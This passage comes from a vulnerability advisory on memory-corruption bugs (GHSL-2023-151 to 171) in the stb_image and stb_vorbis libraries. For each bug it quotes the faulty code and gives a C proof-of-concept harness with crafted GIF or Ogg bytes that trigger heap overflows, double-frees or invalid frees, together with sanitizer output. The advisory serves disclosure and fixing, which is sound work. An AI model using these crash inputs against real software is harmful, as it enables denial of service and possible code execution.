                            0x43,0x05,0xff,0xbe,0x21,0x00,0x30,0x03,0x01,0x00,0x21,0x00,0x2c,
                            0x00,0x00,0x00,0x00,0xbd,0x00,0x3f,0x71,0x07,0x00,0x05,0xff,0xbe,
                            0x01,0x00,0x00,0x00,0x21,0xf9,0x04,0x09,0x0a,0x00,0x1f,0x00,0x2c,
                            0x00,0x00,0x00,0x00,0xbd,0x00,0x71,0x00,0x00,0x05,0xff,0xe0,0x27,
                            0x8e,0x64,0x69,0x9e,0x68,0xaa,0xae,0x01,0x00,0x00,0x01,0x2c,0xcf,
                            0x74,0x6d,0xdf,0x78,0xae,0xef,0x7c,0x01,0x4f,0xc0,0xa0,0x70,0x48,
                            0x2c,0x1a,0x21,0x01,0x12,0x72,0xc9,0x6c,0x3a,0x9f,0x21,0xfe,0x74,
                            0x4a,0xad,0x5a,0x8f,0xd8,0xac,0x76,0xcb,0xed,0x7a,0xbf,0xe0,0xb0,
                            0x78};
    size_t size = sizeof(data);

    int x, y, z, channels;
    int* delays = NULL;
    stbi_uc *img = stbi_load_gif_from_memory(data, size, &delays, &x, &y, &z, &channels, 4);
    free(delays);
    stbi_image_free(img);
    return 0;
}

```

1. Run the program with ASAN with an instruction that allocator may fail (otherwise ASAN will quit early with `AddressSanitizer: requested allocation size ... exceeds maximum supported size`): `ASAN_OPTIONS=allocator_may_return_null=1 <program name>` to hit the error.

```
==253229==ERROR: AddressSanitizer: attempting double-free on 0x602000000010 in thread T0:
    #0 0x49e542 in free /src/llvm-project/compiler-rt/lib/asan/asan_malloc_linux.cpp:52:3
    #1 0x4e4064 in main tests/repro.c:22:5

```
### Issue 7: Null pointer dereference because of an uninitialized variable (`GHSL-2023-151`)

If [`stbi__load_gif_main`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L1448) in [`stbi_load_gif_from_memory`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L1442-L1454) [1] fails it returns a null pointer and may keep the `z` variable uninitialized. In case the caller also sets the flip vertically flag [2], it continues and calls `stbi__vertical_flip_slices` [3] with the null pointer `result` value and the uninitialized `z` value.

```
STBIDEF stbi_uc *stbi_load_gif_from_memory(stbi_uc const *buffer, int len, int **delays, int *x, int *y, int *z, int *comp, int req_comp)
{
   unsigned char *result;
   stbi__context s;
   stbi__start_mem(&s,buffer,len);

   result = (unsigned char*) stbi__load_gif_main(&s, delays, x, y, z, comp, req_comp); // [1]
   if (stbi__vertically_flip_on_load) { // [2]
      stbi__vertical_flip_slices( result, *x, *y, *z, *comp ); // [3]
   }

   return result;
}

```

It depends on the value of `z` [4] if the program enters the loop and attempts to dereference the null pointer value in `stbi__vertical_flip` [5].

```
static void stbi__vertical_flip_slices(void *image, int w, int h, int z, int bytes_per_pixel)
{
   int slice;
   int slice_size = w * h * bytes_per_pixel;

   stbi_uc *bytes = (stbi_uc *)image;
   for (slice = 0; slice < z; ++slice) { // [4]
      stbi__vertical_flip(bytes, w, h, bytes_per_pixel); // [5]
      bytes += slice_size;
   }
}

```
#### Impact

This issue may lead to denial of service.

#### Resources

To reproduce the issue in `stbi__vertical_flip_slices`:

1. Make MSAN build of the following program:

```
#include <stdint.h>
#define STB_IMAGE_IMPLEMENTATION
#include "../stb_image.h"

int main(int argc, char* argv[])
{
    const uint8_t data[] = {0x47,0x49,0x38,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x35,0xff};
    size_t size = sizeof(data);

    stbi_set_flip_vertically_on_load(1);
    int x, y, z, channels;
    stbi_uc *img = stbi_load_gif_from_memory(data, size, NULL, &x, &y, &z, &channels, 4);
    stbi_image_free(img);
    return 0;
}

```

1. Set breakpoint at line 1251 in [`stbi__vertical_flip_slices`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h#L1251) and run the program to hit the usage of the uninitialized memory.

```
==292219==WARNING: MemorySanitizer: use-of-uninitialized-value
    #0 0x4b0ad6 in stbi__vertical_flip_slices(void*, int, int, int, int) tests/../stb_image.h:1251:4
    #1 0x4ad19e in stbi_load_gif_from_memory tests/../stb_image.h:1450:7

```
### Issue 8: `0` byte write heap buffer overflow in `start_decoder` (`GHSL-2023-165`)

A crafted file may trigger out of bounds write in [`f->vendor[len] = (char)'\0';`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3658) [1]. The root cause is that if [`len` read in `start_decoder`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3652-L3658) [2] is `-1` and `len + 1` becomes `0` when passed to `setup_malloc` in [3].

```
   len = get32_packet(f); // [2]
   f->vendor = (char*)setup_malloc(f, sizeof(char) * (len+1)); // [3]
   if (f->vendor == NULL)                           return error(f, VORBIS_outofmem);
   for(i=0; i < len; ++i) {
      f->vendor[i] = get8_packet(f);
   }
   f->vendor[len] = (char)'\0'; // [1]

```

The [`setup_malloc`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L950-L960) behaves differently when `f->alloc.alloc_buffer` is pre-allocated. Instead of returning `NULL` as in `malloc` case [4] it shifts the pre-allocated buffer by zero and returns the currently available memory block.

```
static void *setup_malloc(vorb *f, int sz)
{
   sz = (sz+7) & ~7; // round up to nearest 8 for alignment of future allocs.
   f->setup_memory_required += sz;
   if (f->alloc.alloc_buffer) {
      void *p = (char *) f->alloc.alloc_buffer + f->setup_offset; // [5]
      if (f->setup_offset + sz > f->temp_offset) return NULL;
      f->setup_offset += sz;
      return p;
   }
   return sz ? malloc(sz) : NULL; // [4]
}

```
#### Impact

This issue may lead to code execution.

#### Resources

To reproduce the issue:

1. Make ASAN build of the following program:

```
#include "../stb_vorbis.c"
#include <stdint.h>

int main(int argc, char* argv[])
{
    const uint8_t data[] = {0x4f,0x67,0x67,0x53,0x00,0x02,0xac,0xf4,0x30,
                            0x19,0x50,0x13,0x00,0x68,0x00,0x00,0x00,0x21,
                            0x00,0x40,0x00,0x00,0x00,0x7e,0x84,0x04,0x01,
                            0x1e,0x01,0x76,0x6f,0x72,0x62,0x69,0x73,0x00,
                            0x00,0x00,0x00,0x05,0x00,0x45,0xc5,0x87,0x03,
                            0x00,0x04,0x00,0x02,0x00,0x08,0x00,0x00,0x01,
                            0x00,0x2e,0xa9,0xcb,0x4f,0x67,0x67,0x53,0x00,
                            0x28,0x00,0x00,0xf7,0xff,0xff,0x7f,0x68,0x00,
                            0xff,0xff,0xff,0xff,0xff,0xff,0xff,0x76,0x6f,
                            0x72,0x73,0x00,0x00,0x03,0x76,0x6f,0x72,0x62,
                            0x69,0x73,0xff,0xff,0xff,0xff};
    size_t size = sizeof(data);

    stb_vorbis_alloc alloc;
    int alloc_buffer_length = 600 * 1024;
    alloc.alloc_buffer = (char*)malloc(alloc_buffer_length);
    alloc.alloc_buffer_length_in_bytes = alloc_buffer_length;
    int err;
    stb_vorbis* out = stb_vorbis_open_memory(data, size, &err, &alloc);
    stb_vorbis_close(out);
    free(alloc.alloc_buffer);
    return 0;
}

```

1. Run the program to hit the error.

```
==93713==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7f37941697ff at pc 0x0000004e41ed bp 0x7ffe67641670 sp 0x7ffe67641668
WRITE of size 1 at 0x7f37941697ff thread T0
    #0 0x4e41ec in start_decoder(stb_vorbis*) tests/../stb_vorbis.c:3658:19
    #1 0x4f9444 in stb_vorbis_open_memory tests/../stb_vorbis.c:5112:8

```
### Issue 9: Multi-byte write heap buffer overflow in `start_decoder` (`GHSL-2023-166`)

A crafted file may trigger out of bounds write in [`f->vendor[i] = get8_packet(f);`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3656). The root cause is an integer overflow in [`setup_malloc`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L950-L960). A sufficiently large `sz` overflows `sz+7` in [1] and the negative value passes the maximum available memory buffer check in [2].

```
static void *setup_malloc(vorb *f, int sz)
{
   sz = (sz+7) & ~7; // round up to nearest 8 for alignment of future allocs. // [1] Int overflow
   f->setup_memory_required += sz;
   if (f->alloc.alloc_buffer) {
      void *p = (char *) f->alloc.alloc_buffer + f->setup_offset;
      if (f->setup_offset + sz > f->temp_offset) return NULL; // [2] Negative int passes the check
      f->setup_offset += sz;
      return p;
   }
   return sz ? malloc(sz) : NULL;
}

```

Similar overflow exists in [`setup_temp_malloc`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L969-L978) at [3]

```
static void *setup_temp_malloc(vorb *f, int sz)
{
   sz = (sz+7) & ~7; // round up to nearest 8 for alignment of future allocs. // [3]
   if (f->alloc.alloc_buffer) {
      if (f->temp_offset - sz < f->setup_offset) return NULL;
      f->temp_offset -= sz;
      return (char *) f->alloc.alloc_buffer + f->temp_offset;
   }
   return malloc(sz);
}

```
#### Impact

This issue may lead to code execution.

#### Resources

To reproduce the issue:

1. Make ASAN build of the following program:

```
#include "../stb_vorbis.c"
#include <stdint.h>

int main(int argc, char* argv[])
{
    const uint8_t data[] = {0x4f,0x67,0x67,0x53,0x00,0x02,0xff,0xb8,0x03,
                            0x00,0xff,0x20,0xff,0x00,0x21,0x68,0x00,0x00,
                            0x00,0x00,0x00,0x00,0xa0,0x6a,0xab,0x75,0x01,
                            0x1e,0x01,0x76,0x6f,0x72,0x62,0x69,0x73,0x00,
                            0x00,0x00,0x00,0x01,0x31,0xef,0xf9,0xfe,0x00,
                            0x00,0x09,0x00,0x00,0x71,0x02,0x10,0x00,0x08,
                            0x00,0x9f,0xb8,0x01,0x4f,0x67,0x67,0x53,0x00,
                            0x00,0x1c,0x00,0x80,0xff,0x01,0x40,0x21,0x68,
                            0x00,0x00,0x01,0x00,0x00,0x00,0xfe,0xff,0xff,
                            0x7f,0x00,0x00,0x00,0x03,0x76,0x6f,0x72,0x62,
                            0x69,0x73,0xfe,0xff,0xff,0x7f};
    size_t size = sizeof(data);

    stb_vorbis_alloc alloc;
    int alloc_buffer_length = 600 * 1024;
    alloc.alloc_buffer = (char*)malloc(alloc_buffer_length);
    alloc.alloc_buffer_length_in_bytes = alloc_buffer_length;
    int err;
    stb_vorbis* out = stb_vorbis_open_memory(data, size, &err, &alloc);
    stb_vorbis_close(out);
    free(alloc.alloc_buffer);
    return 0;
}

```

1. Run the program to hit the error.

```
==95610==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7f0f5eaff800 at pc 0x0000004e4133 bp 0x7fff88645e30 sp 0x7fff88645e28
WRITE of size 1 at 0x7f0f5eaff800 thread T0
    #0 0x4e4132 in start_decoder(stb_vorbis*) tests/../stb_vorbis.c:3656:20
    #1 0x4f9444 in stb_vorbis_open_memory tests/../stb_vorbis.c:5112:8

```
### Issue 10: Heap buffer out of bounds write in `start_decoder` (`GHSL-2023-167`)

A crafted file may trigger out of bounds write in [`f->vendor[len] = (char)'\0';`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3658) [1]. The root cause is that if [`len` read in `start_decoder`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3652-L3658) [2] is a negative number and [`setup_malloc`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L950-L961) [3] successfully allocates memory in that case [4], but memory write is done with a negative index `len` [1].

```
   len = get32_packet(f); // [2]
   f->vendor = (char*)setup_malloc(f, sizeof(char) * (len+1)); // [3]
   if (f->vendor == NULL)                           return error(f, VORBIS_outofmem);
   for(i=0; i < len; ++i) {
      f->vendor[i] = get8_packet(f);
   }
   f->vendor[len] = (char)'\0'; // [1]

...

static void *setup_malloc(vorb *f, int sz)
{
   sz = (sz+7) & ~7; // round up to nearest 8 for alignment of future allocs.
   f->setup_memory_required += sz;
   if (f->alloc.alloc_buffer) {
      void *p = (char *) f->alloc.alloc_buffer + f->setup_offset; // [4]
      if (f->setup_offset + sz > f->temp_offset) return NULL;
      f->setup_offset += sz;
      return p;
   }
   return sz ? malloc(sz) : NULL;
}

```

Same vulnerability exists in [`setup_temp_malloc`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L969-L978) at [5]

```
static void *setup_temp_malloc(vorb *f, int sz)
{
   sz = (sz+7) & ~7; // round up to nearest 8 for alignment of future allocs.
   if (f->alloc.alloc_buffer) {
      if (f->temp_offset - sz < f->setup_offset) return NULL; // [5]
      f->temp_offset -= sz;
      return (char *) f->alloc.alloc_buffer + f->temp_offset;
   }
   return malloc(sz);
}

```

Similarly if `len` is `INT_MAX` the integer overflow `len+1` happens in [`f->vendor = (char*)setup_malloc(f, sizeof(char) * (len+1));`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3653) [1] and [`f->comment_list[i] = (char*)setup_malloc(f, sizeof(char) * (len+1));`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3670C7-L3670C75) [6]. This case however allows writing multiple times past the end of the internal `f->alloc.alloc_buffer` buffer.

```
   for(i=0; i < f->comment_list_length; ++i) {
      len = get32_packet(f);
      f->comment_list[i] = (char*)setup_malloc(f, sizeof(char) * (len+1)); // [6]
      if (f->comment_list[i] == NULL)               return error(f, VORBIS_outofmem);

      for(j=0; j < len; ++j) {
         f->comment_list[i][j] = get8_packet(f);
      }
      f->comment_list[i][len] = (char)'\0';
   }

```
#### Impact

This issue may lead to code execution.

#### Resources

To reproduce the issue:

1. Make ASAN build of the following program:

```
#include "../stb_vorbis.c"
#include <stdint.h>

int main(int argc, char* argv[])
{
    const uint8_t data[] = {0x4f,0x67,0x67,0x53,0x00,0x02,0xac,0xf4,0x30,
                            0x19,0x50,0x13,0x00,0x68,0x00,0x00,0x00,0x21,
                            0x00,0x40,0x00,0x00,0x00,0x7e,0x84,0x04,0x01,
                            0x1e,0x01,0x76,0x6f,0x72,0x62,0x69,0x73,0x00,
                            0x00,0x00,0x00,0x05,0x00,0x45,0xc5,0x87,0x03,
                            0x00,0x04,0x00,0x02,0x00,0x08,0x00,0x00,0x01,
                            0x00,0x2e,0xa9,0xcb,0x4f,0x67,0x67,0x53,0x00,
                            0x28,0x00,0x00,0xf7,0xff,0xff,0x7f,0x68,0x00,
                            0xff,0xff,0xff,0xff,0xff,0xff,0xff,0x76,0x6f,
                            0x72,0x73,0x00,0x00,0x03,0x76,0x6f,0x72,0x62,
                            0x69,0x73,0xff,0xff,0xff,0xee};
    size_t size = sizeof(data);

    stb_vorbis_alloc alloc;
    int alloc_buffer_length = 600 * 1024;
    alloc.alloc_buffer = (char*)malloc(alloc_buffer_length);
    alloc.alloc_buffer_length_in_bytes = alloc_buffer_length;
    int err;
    stb_vorbis* out = stb_vorbis_open_memory(data, size, &err, &alloc);
    stb_vorbis_close(out);
    free(alloc.alloc_buffer);
    return 0;
}

```

1. Run the program to hit the error.

```
AddressSanitizer:DEADLYSIGNAL
=================================================================
==302322==ERROR: AddressSanitizer: SEGV on unknown address 0x7f70bd3697ff (pc 0x0000004e41f4 bp 0x7ffc029b3070 sp 0x7ffc029b0be0 T0)
==302322==The signal is caused by a WRITE memory access.
    #0 0x4e41f4 in start_decoder(stb_vorbis*) tests/../stb_vorbis.c:3658:19
    #1 0x4f9444 in stb_vorbis_open_memory tests/../stb_vorbis.c:5112:8
    #2 0x4fd8e9 in main tests/stb_vorbis_fuzzer.c:24:23

```
### Issue 11: Off-by-one heap buffer write in `start_decoder` (`GHSL-2023-168`)

A crafted file may trigger out of buffer write in [`start_decoder`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L4105-L4111) at [1] and [2]

```
      for (j=0; j < m->submaps; ++j) {
         get_bits(f,8); // discard
         m->submap_floor[j] = get_bits(f,8); // [1] Off by one write
         m->submap_residue[j] = get_bits(f,8); // [2] Off by one write
         if (m->submap_floor[j] >= f->floor_count)      return error(f, VORBIS_invalid_setup);
         if (m->submap_residue[j] >= f->residue_count)  return error(f, VORBIS_invalid_setup);
      }

```

because at maximum `m->submaps` [can be 16](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L4074-L4079) [3]

```
      if (get_bits(f,1))
         m->submaps = get_bits(f,4)+1; // [3]
      else
         m->submaps = 1;
      if (m->submaps > max_submaps)
         max_submaps = m->submaps;

```

but [`submap_floor` and `submap_residue` are declared](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L753-L760) as arrays of 15 elements at [4] and [5]

```
typedef struct
{
   uint16 coupling_steps;
   MappingChannel *chan;
   uint8  submaps;
   uint8  submap_floor[15]; // varies // [4]
   uint8  submap_residue[15]; // varies // [5]
} Mapping;

```
#### Impact

This issue may lead to code execution.

#### Resources

To reproduce the issue:

1. Make UBSAN build of the following program:

```
#include "../stb_vorbis.c"
#include <stdint.h>

int main(int argc, char* argv[])
{
    const uint8_t data[] = {0x4f,0x67,0x67,0x53,0x00,0x02,0x01,0x5a,0x81,
                            0x15,0x9c,0x00,0x00,0xbe,0x21,0x68,0x00,0x00,
                            0x00,0x00,0x00,0x00,0xa2,0x64,0x89,0x6f,0x01,
                            0x1e,0x01,0x76,0x6f,0x72,0x62,0x69,0x73,0x00,
                            0x00,0x00,0x00,0x0e,0x31,0x1e,0x01,0x76,0x6f,
                            0x72,0xe3,0x12,0x02,0x62,0x69,0x20,0xd7,0x73,
                            0x06,0xd0,0x97,0x75,0x4f,0x67,0x67,0x53,0x00,
                            0x9c,0x00,0xfc,0x00,0x4b,0x02,0x2d,0x24,0x00,
                            0x21,0x68,0x00,0x00,0x01,0x00,0x00,0x00,0xff,
                            0xff,0xff,0x05,0x05,0x16,0x3e,0x16,0x01,0x01,
                            0x03,0x76,0x6f,0x72,0x62,0x69,0x73,0x00,0x00,
                            0x00,0x00,0x00,0x00,0x00,0x00,0x27,0x04,0x00,
                            0x7b,0x0b,0x12,0x0d,0x05,0x76,0x6f,0x72,0x62,
                            0x69,0x73,0x00,0x42,0x43,0x56,0x27,0x01,0x04,
                            0x00,0x00,0x04,0x20,0x04,0x00,0x00,0x00,0x40,
                            0x00,0x00,0x50,0x00,0x01,0x00,0x00,0x81,0x00,
                            0x00,0x08,0xd2,0x00,0x00,0x00,0x00,0x00,0x00,
                            0x00,0x80,0x0f,0x20,0x10,0x28,0x30,0x18,0x15,
                            0x15,0x15,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                            0x00,0x00,0x00,0x00,0x8a,0x8a,0xff,0x00};
    size_t size = sizeof(data);

    stb_vorbis* out = stb_vorbis_open_memory(data, size, NULL, NULL);
    stb_vorbis_close(out);
    return 0;
}

```

1. Run the program to hit the error.

```
/src/stb/tests/../stb_vorbis.c:4107:10: runtime error: index 15 out of bounds for type 'uint8[15]' (aka 'unsigned char[15]')
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior /src/stb/tests/../stb_vorbis.c:4107:10 in

```
### Issue 12: Attempt to free an uninitialized memory pointer in `vorbis_deinit` (`GHSL-2023-169`)

A crafted file may trigger memory allocation failure in [`start_decoder`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3660-L3677) at [1]. In that case the function returns early [2], but some of the pointers in `f->comment_list` are left initialized [3].

```
   f->comment_list_length = get32_packet(f);
   f->comment_list = NULL;
   if (f->comment_list_length > 0)
   {
      f->comment_list = (char**) setup_malloc(f, sizeof(char*) * (f->comment_list_length)); // [3]
      if (f->comment_list == NULL)                  return error(f, VORBIS_outofmem);
   }

   for(i=0; i < f->comment_list_length; ++i) {
      len = get32_packet(f);
      f->comment_list[i] = (char*)setup_malloc(f, sizeof(char) * (len+1)); // [1] OOM
      if (f->comment_list[i] == NULL)               return error(f, VORBIS_outofmem); // [2]

      for(j=0; j < len; ++j) {
         f->comment_list[i][j] = get8_packet(f);
      }
      f->comment_list[i][len] = (char)'\0';
   }

```

Later `setup_free` is called on these pointers in [`vorbis_deinit`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L4208-L4215) [4].

```
static void vorbis_deinit(stb_vorbis *p)
{
   int i,j;

   setup_free(p, p->vendor);
   for (i=0; i < p->comment_list_length; ++i) {
      setup_free(p, p->comment_list[i]); // [4]
   }

```
#### Impact

This issue may lead to code execution.

#### Resources

To reproduce the issue:

1. Make ASAN build of the following program:

```
#include "../stb_vorbis.c"
#include <stdint.h>

int main(int argc, char* argv[])
{
    const uint8_t data[] = {0x4f,0x67,0x67,0x53,0x00,0x7a,0x18,0xfe,0xa9,0x00,0x53,
                            0x00,0xe3,0xb5,0x21,0x68,0x00,0x00,0x00,0x00,0x00,0x00,
                            0x6b,0x0e,0xa0,0x75,0x01,0x1e,0x01,0x76,0x6f,0x72,0x62,
                            0x69,0x73,0x00,0x00,0x00,0x00,0x01,0xfb,0x07,0xae,0x69,
                            0x73,0x00,0x00,0x00,0x00,0x2e,0x09,0x3c,0xff,0x30,0x00,
                            0x01,0xa9,0xf9,0x4f,0x67,0x67,0x53,0x00,0x00,0x00,0x7e,
                            0x79,0x6f,0x42,0x0c,0xc5,0x97,0x21,0x68,0x00,0x00,0x01,
                            0x00,0x00,0x00,0x6f,0x11,0x00,0x00,0x00,0x03,0x76,0x6f,
                            0x72,0x62,0x69,0x73,0x00,0x00,0x00,0x00,0x2e};
    size_t size = sizeof(data);

    int chan, samplerate;
    short *output;
    int samples = stb_vorbis_decode_memory(data, size, &chan, &samplerate, &output);
    if (samples >= 0)
        free(output);
    return 0;
}

```

1. Run the program with an instruction that allocator may fail (otherwise ASAN will quit early with `AddressSanitizer: requested allocation size ... exceeds maximum supported size`): `ASAN_OPTIONS=allocator_may_return_null=1 <program name>` to hit the error.

```
AddressSanitizer:DEADLYSIGNAL
=================================================================
==217447==ERROR: AddressSanitizer: SEGV on unknown address (pc 0x00000041f6d4 bp 0x000000000000 sp 0x7ffd3e146c60 T0)
==217447==The signal is caused by a READ memory access.
    #0 0x41f6d4 in atomic_compare_exchange_strong<__sanitizer::atomic_uint8_t> /src/llvm-project/compiler-rt/lib/asan/../sanitizer_common/sanitizer_atomic_clang.h:81:10
    #1 0x41f6d4 in AtomicallySetQuarantineFlagIfAllocated /src/llvm-project/compiler-rt/lib/asan/asan_allocator.cpp:610:10
    #2 0x41f6d4 in __asan::Allocator::Deallocate(void*, unsigned long, unsigned long, __sanitizer::BufferedStackTrace*, __asan::AllocType) /src/llvm-project/compiler-rt/lib/asan/asan_allocator.cpp:685:10
    #3 0x49e5d5 in free /src/llvm-project/compiler-rt/lib/asan/asan_malloc_linux.cpp:53:3
    #4 0x4dcedb in setup_free(stb_vorbis*, void*) tests/../stb_vorbis.c:966:4
    #5 0x4dbe57 in vorbis_deinit(stb_vorbis*) tests/../stb_vorbis.c:4214:7
    #6 0x4f9638 in stb_vorbis_open_memory tests/../stb_vorbis.c:5122:4
    #7 0x4fbfb1 in stb_vorbis_decode_memory tests/../stb_vorbis.c:5390:20

```
### Issue 13: Null pointer dereference in `vorbis_deinit` (`GHSL-2023-170`)

A crafted file may trigger memory allocation failure in [`start_decoder`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3660-L3666) at [1]. In that case the function returns early [2], the `f->comment_list` is set to `NULL`, but `f->comment_list_length` is not reset.

```
   f->comment_list_length = get32_packet(f);
   f->comment_list = NULL;
   if (f->comment_list_length > 0)
   {
      f->comment_list = (char**) setup_malloc(f, sizeof(char*) * (f->comment_list_length)); // [1] OOM
      if (f->comment_list == NULL)                  return error(f, VORBIS_outofmem); // [2]
   }

```

Later in [`vorbis_deinit`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L4208-L4215) it tries to dereference the `NULL` pointer at [3].

```
static void vorbis_deinit(stb_vorbis *p)
{
   int i,j;

   setup_free(p, p->vendor);
   for (i=0; i < p->comment_list_length; ++i) {
      setup_free(p, p->comment_list[i]); // [3]
   }

```
#### Impact

This issue may lead to denial of service.

#### Resources

To reproduce the issue:

1. Make ASAN build of the following program:

```
#include "../stb_vorbis.c"
#include <stdint.h>

int main(int argc, char* argv[])
{
    const uint8_t data[] = {0x4f,0x67,0x67,0x53,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                            0xb6,0xe4,0xb5,0x67,0x00,0x00,0x00,0x00,0x3b,0x21,0x03,0x0f,0x01,0x1e,
                            0x01,0x76,0x6f,0x72,0x62,0x69,0x73,0x00,0x00,0x00,0x00,0x01,0x44,0xac,
                            0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x38,0x01,0x00,0x00,0x00,0x00,0x00,
                            0xb8,0x01,0x4f,0x67,0x67,0x53,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                            0x00,0x00,0xb6,0xe4,0xb5,0x67,0x01,0x00,0x00,0x00,0x83,0xb5,0x32,0x7b,
                            0x0e,0x3b,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,
                            0x81,0x03,0x76,0x6f,0x72,0x62,0x69,0x73,0x2b,0x00,0x00,0x00,0x58,0x69,
                            0x70,0x68,0x2e,0x4f,0x72,0x67,0x20,0x6c,0x69,0x62,0x56,0x6f,0x72,0x62,
                            0x69,0x73,0x20,0x73,0xbe,0x61,0x97,0xcc,0x7c,0x55,0x7e,0xc6,0x03,0x1a,
                            0x85,0x7f,0x3d,0x39,0x3f,0x7f,0x8b,0xa9,0x41,0x21,0x11,0x14,0xf7,0x47,
                            0x7a,0x38,0x30,0x05,0x48,0xa5,0x77,0x3b,0x31,0x88,0xaa,0xba,0xd9,0xdd,
                            0x8f,0x4e,0xfd,0xbd,0xa2,0xa7,0x0e,0xb7,0x02,0x78,0x00,0x3e,0x96,0xfc,
                            0xef,0xac,0x5f,0x9a,0x02,0x36,0x00,0x82,0x2a,0x82,0x12,0x0c,0x04,0x22,
                            0x02,0x00,0x00,0x3c,0x58,0x06,0x9e,0x8f,0x59,0xd9,0xb0,0x6f,0x68,0xea,
                            0x52,0x32,0x1f,0x02,0x66,0xd3,0x81,0xa5,0x77,0xb1,0x23,0x2f,0x69,0xeb,
                            0x3f,0x61,0x04,0x65,0x9d,0xcf,0x87,0x93,0x9c,0x30,0xab,0x98,0xc1,0x29,
                            0x79,0x9c,0xb3,0x84,0xe9,0x16,0x00,0x1a,0x00,0x77,0xc4,0x84,0x86,0x31,
                            0x00,0x34,0xa0,0x03};
    size_t size = sizeof(data);

    int chan, samplerate;
    short *output;
    int samples = stb_vorbis_decode_memory(data, size, &chan, &samplerate, &output);
    if (samples >= 0)
        free(output);
    return 0;
}

```

1. Run the program to hit the error.

```
AddressSanitizer:DEADLYSIGNAL
=================================================================
==264664==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x0000004dbe50 bp 0x7ffddf2f2e30 sp 0x7ffddf2f2b40 T0)
==264664==The signal is caused by a READ memory access.
    #0 0x4dbe50 in vorbis_deinit(stb_vorbis*) tests/../stb_vorbis.c:4214:21
    #1 0x4f9638 in stb_vorbis_open_memory tests/../stb_vorbis.c:5122:4
    #2 0x4fbfb1 in stb_vorbis_decode_memory tests/../stb_vorbis.c:5390:20

```
### Issue 14: Out of bounds heap buffer write (`GHSL-2023-171`)

A crafted file may trigger memory write past an allocated heap buffer in [`start_decoder`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3660-L3677) at [1]. The root cause is a potential integer overflow `sizeof(char*) * (f->comment_list_length)` at [2] which may make `setup_malloc` allocate less memory than required. Since there is another integer overflow at [1] attacker may overflow it too to force `setup_malloc` to return `0` and make the exploit more reliable.

```
   f->comment_list_length = get32_packet(f);
   f->comment_list = NULL;
   if (f->comment_list_length > 0)
   {
      f->comment_list = (char**) setup_malloc(f, sizeof(char*) * (f->comment_list_length)); // [2] Int overflow
      if (f->comment_list == NULL)                  return error(f, VORBIS_outofmem);
   }

   for(i=0; i < f->comment_list_length; ++i) {
      len = get32_packet(f);
      f->comment_list[i] = (char*)setup_malloc(f, sizeof(char) * (len+1)); // [1] OOB
      if (f->comment_list[i] == NULL)               return error(f, VORBIS_outofmem);

      for(j=0; j < len; ++j) {
         f->comment_list[i][j] = get8_packet(f);
      }
      f->comment_list[i][len] = (char)'\0';
   }

```

Similar potential vulnerability exists in other `setup_malloc` use cases as:

* [`f->codebooks = (Codebook *) setup_malloc(f, sizeof(*f->codebooks) * f->codebook_count);`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3716)
* [`c->codewords = (uint32 *) setup_malloc(f, sizeof(c->codewords[0]) * c->entries);`](https://github.com/nothings/stb/blob/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_vorbis.c#L3802)
* etc.

#### Impact

This issue may lead to code execution.

#### Resources

To reproduce the issue:

1. Make ASAN build of the following program:

```
#include "../stb_vorbis.c"
#include <stdint.h>

int main(int argc, char* argv[])
{
    const uint8_t data[] = {0x4f,0x67,0x67,0x53,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
